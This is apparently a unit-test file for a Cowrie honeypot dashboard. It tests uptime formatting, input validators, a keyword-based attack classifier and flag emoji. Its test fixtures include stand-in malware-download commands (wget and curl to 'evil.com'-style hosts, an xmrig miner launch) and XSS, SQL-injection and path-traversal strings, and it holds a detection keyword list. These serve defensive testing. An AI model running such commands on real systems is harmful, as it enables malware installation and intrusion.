// ============================================
// UNIT TESTS - Pure helper functions from server.js
// Run with: npm run test:unit
// These tests do NOT need the server running
// ============================================

// ── Copy the helpers here so we can test them in isolation ──────────────────
// (Once you extract these to a helpers.js file, replace with: import { ... } from '../../helpers.js')

function formatUptime(seconds) {
  const days = Math.floor(seconds / 86400);
  const hours = Math.floor((seconds % 86400) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const parts = [];
  if (days > 0) parts.push(`${days}d`);
  if (hours > 0) parts.push(`${hours}h`);
  if (minutes > 0) parts.push(`${minutes}m`);
  return parts.join(' ') || '< 1m';
}

function isValidSessionId(id) {
  return typeof id === 'string' && /^[a-zA-Z0-9\-]+$/.test(id);
}

function isValidRange(r) {
  return r === 'all' || /^now-\d+[dh]$/.test(r);
}

function classifyAttackType(events) {
  const cmdString = events
    .filter(e => e.eventid === 'cowrie.command.input')
    .map(e => (e.command_input || e.message || '').toLowerCase())
    .join(' ');

  const hasFileDownload = events.some(e => e.eventid === 'cowrie.session.file_download');
  const hasLoginSuccess = events.some(e => e.eventid === 'cowrie.login.success');
  const hasLoginFailed  = events.some(e => e.eventid === 'cowrie.login.failed');
  const hasCommands     = events.some(e => e.eventid === 'cowrie.command.input');

  if (hasFileDownload ||
      cmdString.includes('wget') || cmdString.includes('curl') ||
      cmdString.includes('chmod') || cmdString.includes('.sh') ||
      cmdString.includes('xmrig') || cmdString.includes('miner') ||
      cmdString.includes('crontab') || cmdString.includes('base64')) {
    return 'Malware Download';
  }

  if (hasCommands && (
      cmdString.includes('whoami') || cmdString.includes('uname') ||
      cmdString.includes('cat /etc') || cmdString.includes('ps aux') ||
      cmdString.includes('netstat') || cmdString.includes('ifconfig') ||
      cmdString.includes('hostname') || cmdString.includes(' id') ||
      cmdString.includes('ls /') || cmdString.includes('/proc') ||
      cmdString.includes('cat /proc') || cmdString.includes('env'))) {
    return 'Reconnaissance';
  }

  if (hasCommands) return 'Command Injection';
  if (hasLoginSuccess || hasLoginFailed) return 'Brute Force';
  return 'Brute Force';
}

function getCountryFlag(countryCode) {
  if (!countryCode || countryCode === 'XX') return '🏴';
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map(char => 127397 + char.charCodeAt());
  return String.fromCodePoint(...codePoints);
}

// ── TESTS ────────────────────────────────────────────────────────────────────

// ============================================
// formatUptime()
// ============================================
describe('formatUptime()', () => {

  test('returns "< 1m" for 0 seconds', () => {
    expect(formatUptime(0)).toBe('< 1m');
  });

  test('returns "< 1m" for 59 seconds (less than a minute)', () => {
    expect(formatUptime(59)).toBe('< 1m');
  });

  test('returns minutes only for values under 1 hour', () => {
    expect(formatUptime(60)).toBe('1m');
    expect(formatUptime(300)).toBe('5m');
    expect(formatUptime(3540)).toBe('59m');
  });

  test('returns hours and minutes', () => {
    expect(formatUptime(3600)).toBe('1h');
    expect(formatUptime(3660)).toBe('1h 1m');
    expect(formatUptime(7320)).toBe('2h 2m');
  });

  test('returns days, hours, and minutes', () => {
    expect(formatUptime(86400)).toBe('1d');
    expect(formatUptime(90000)).toBe('1d 1h');
    expect(formatUptime(90060)).toBe('1d 1h 1m');
  });

  test('handles large uptime values correctly', () => {
    // 4 days 3 hours 13 minutes (matches the screenshot you showed)
    const seconds = (4 * 86400) + (3 * 3600) + (13 * 60);
    expect(formatUptime(seconds)).toBe('4d 3h 13m');
  });

});

// ============================================
// isValidSessionId()
// ============================================
describe('isValidSessionId()', () => {

  test('accepts valid alphanumeric session IDs', () => {
    expect(isValidSessionId('abc123')).toBe(true);
    expect(isValidSessionId('SESSION001')).toBe(true);
    expect(isValidSessionId('a1b2c3d4')).toBe(true);
  });

  test('accepts session IDs with hyphens', () => {
    expect(isValidSessionId('abc-123-def')).toBe(true);
    expect(isValidSessionId('session-id-here')).toBe(true);
  });

  test('rejects session IDs with special characters', () => {
    expect(isValidSessionId('abc 123')).toBe(false);     // space
    expect(isValidSessionId('abc/123')).toBe(false);     // slash
    expect(isValidSessionId('abc<script>')).toBe(false); // XSS attempt
    expect(isValidSessionId('abc;drop')).toBe(false);    // injection
    expect(isValidSessionId('../etc/passwd')).toBe(false); // path traversal
  });

  test('rejects non-string inputs', () => {
    expect(isValidSessionId(123)).toBe(false);
    expect(isValidSessionId(null)).toBe(false);
    expect(isValidSessionId(undefined)).toBe(false);
    expect(isValidSessionId({})).toBe(false);
  });

  test('rejects empty string', () => {
    expect(isValidSessionId('')).toBe(false);
  });

});

// ============================================
// isValidRange()
// ============================================
describe('isValidRange()', () => {

  test('accepts "all" as valid range', () => {
    expect(isValidRange('all')).toBe(true);
  });

  test('accepts valid now-Xh formats', () => {
    expect(isValidRange('now-1h')).toBe(true);
    expect(isValidRange('now-24h')).toBe(true);
    expect(isValidRange('now-72h')).toBe(true);
  });

  test('accepts valid now-Xd formats', () => {
    expect(isValidRange('now-1d')).toBe(true);
    expect(isValidRange('now-7d')).toBe(true);
    expect(isValidRange('now-30d')).toBe(true);
  });

  test('rejects invalid range strings', () => {
    expect(isValidRange('now-1w')).toBe(false);    // week not supported
    expect(isValidRange('yesterday')).toBe(false);
    expect(isValidRange('now')).toBe(false);
    expect(isValidRange('')).toBe(false);
    expect(isValidRange(null)).toBe(false);
  });

  test('rejects injection attempts', () => {
    expect(isValidRange('now-1h; DROP TABLE')).toBe(false);
    expect(isValidRange('<script>alert(1)</script>')).toBe(false);
  });

});

// ============================================
// classifyAttackType()
// ============================================
describe('classifyAttackType()', () => {

  test('classifies wget command as Malware Download', () => {
    const events = [
      { eventid: 'cowrie.command.input', command_input: 'wget http://malicious.com/payload.sh' }
    ];
    expect(classifyAttackType(events)).toBe('Malware Download');
  });

  test('classifies curl command as Malware Download', () => {
    const events = [
      { eventid: 'cowrie.command.input', command_input: 'curl -O http://evil.com/miner' }
    ];
    expect(classifyAttackType(events)).toBe('Malware Download');
  });

  test('classifies xmrig as Malware Download (crypto miner)', () => {
    const events = [
      { eventid: 'cowrie.command.input', command_input: './xmrig --pool pool.minexmr.com' }
    ];
    expect(classifyAttackType(events)).toBe('Malware Download');
  });

  test('classifies file download event as Malware Download', () => {
    const events = [
      { eventid: 'cowrie.session.file_download', message: 'File downloaded' }
    ];
    expect(classifyAttackType(events)).toBe('Malware Download');
  });

  test('classifies whoami as Reconnaissance', () => {
    const events = [
      { eventid: 'cowrie.command.input', command_input: 'whoami' }
    ];
    expect(classifyAttackType(events)).toBe('Reconnaissance');
  });

  test('classifies uname command as Reconnaissance', () => {
    const events = [
      { eventid: 'cowrie.command.input', command_input: 'uname -a' }
    ];
    expect(classifyAttackType(events)).toBe('Reconnaissance');
  });

  test('classifies ps aux as Reconnaissance', () => {
    const events = [
      { eventid: 'cowrie.command.input', command_input: 'ps aux' }
    ];
    expect(classifyAttackType(events)).toBe('Reconnaissance');
  });

  test('classifies unknown command as Command Injection', () => {
    const events = [
      { eventid: 'cowrie.command.input', command_input: 'echo hello' }
    ];
    expect(classifyAttackType(events)).toBe('Command Injection');
  });

  test('classifies failed login events as Brute Force', () => {
    const events = [
      { eventid: 'cowrie.login.failed' },
      { eventid: 'cowrie.login.failed' },
      { eventid: 'cowrie.login.failed' }
    ];
    expect(classifyAttackType(events)).toBe('Brute Force');
  });

  test('classifies successful login without commands as Brute Force', () => {
    const events = [
      { eventid: 'cowrie.login.success' }
    ];
    expect(classifyAttackType(events)).toBe('Brute Force');
  });

  test('classifies empty events as Brute Force (default)', () => {
    expect(classifyAttackType([])).toBe('Brute Force');
  });

  test('Malware Download takes priority over Reconnaissance', () => {
    // wget + whoami → should still be Malware Download
    const events = [
      { eventid: 'cowrie.command.input', command_input: 'whoami' },
      { eventid: 'cowrie.command.input', command_input: 'wget http://evil.com/payload' }
    ];
    expect(classifyAttackType(events)).toBe('Malware Download');
  });

});

// ============================================
// getCountryFlag()
// ============================================
describe('getCountryFlag()', () => {

  test('returns flag emoji for US', () => {
    expect(getCountryFlag('US')).toBe('🇺🇸');
  });

  test('returns flag emoji for CN', () => {
    expect(getCountryFlag('CN')).toBe('🇨🇳');
  });

  test('returns flag emoji for GB', () => {
    expect(getCountryFlag('GB')).toBe('🇬🇧');
  });

  test('returns 🏴 for null input', () => {
    expect(getCountryFlag(null)).toBe('🏴');
  });

  test('returns 🏴 for unknown code XX', () => {
    expect(getCountryFlag('XX')).toBe('🏴');
  });

  test('handles lowercase country codes', () => {
    // function uppercases internally
    expect(getCountryFlag('us')).toBe('🇺🇸');
  });

});